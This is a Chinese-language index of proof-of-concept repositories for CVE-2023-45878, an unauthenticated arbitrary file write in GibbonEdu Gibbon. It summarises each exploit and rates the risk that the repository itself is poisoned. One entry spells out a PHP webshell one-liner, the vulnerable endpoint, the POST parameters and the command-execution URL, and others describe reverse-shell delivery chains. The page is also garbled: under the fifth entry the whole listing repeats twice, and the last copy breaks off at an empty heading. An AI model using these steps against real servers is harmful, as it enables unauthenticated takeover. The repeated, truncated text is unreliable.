# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

